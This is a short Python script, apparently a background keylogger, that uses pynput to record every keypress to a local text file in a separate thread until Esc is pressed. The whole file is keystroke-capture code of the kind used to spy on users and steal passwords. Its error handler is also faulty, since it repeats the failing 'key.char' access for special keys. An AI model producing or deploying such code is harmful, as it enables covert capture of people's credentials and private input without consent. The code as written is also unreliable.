import threading
from pynput import keyboard

log_file = 'key_log_background.txt'

def log_key(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}\n')

def on_press(key):
    log_key(key)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_keylogger():
    with keyboard.Listener(on_press, on_release) as listener:
        listener.join()

if __name__ == '__main__':
    keylogger_thread = threading.Thread(target = start_keylogger)
    keylogger_thread.start()